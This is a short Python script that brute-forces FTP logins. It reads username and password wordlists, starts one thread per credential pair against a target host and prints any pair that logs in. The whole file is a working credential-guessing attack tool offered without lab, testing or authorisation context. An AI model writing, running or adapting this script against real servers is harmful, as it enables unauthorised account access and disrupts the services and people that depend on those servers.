from ftplib import FTP
import threading

# Attempt to login with given credentials
def attempt_login(target, username, password):
    try:
        ftp = FTP(target, timeout=5)
        ftp.login(user=username, passwd=password)
        print(f"[+] SUCCESS: Username: {username} | Password: {password}")
        ftp.quit()
    except Exception:
        pass  # Connection failed or invalid credentials

# Main brute-force function
def run_brute_force(target, username_file, password_file):
    print(f"[*] Starting brute-force on {target}...\n")

    try:
        with open(username_file, 'r') as uf:
            usernames = [line.strip() for line in uf.readlines()]
        with open(password_file, 'r') as pf:
            passwords = [line.strip() for line in pf.readlines()]
    except FileNotFoundError as e:
        print(f"[-] File error: {e}")
        return

    threads = []

    for username in usernames:
        for password in passwords:
            thread = threading.Thread(target=attempt_login, args=(target, username, password))
            thread.start()
            threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    print("[-] Brute-force attempt completed.")
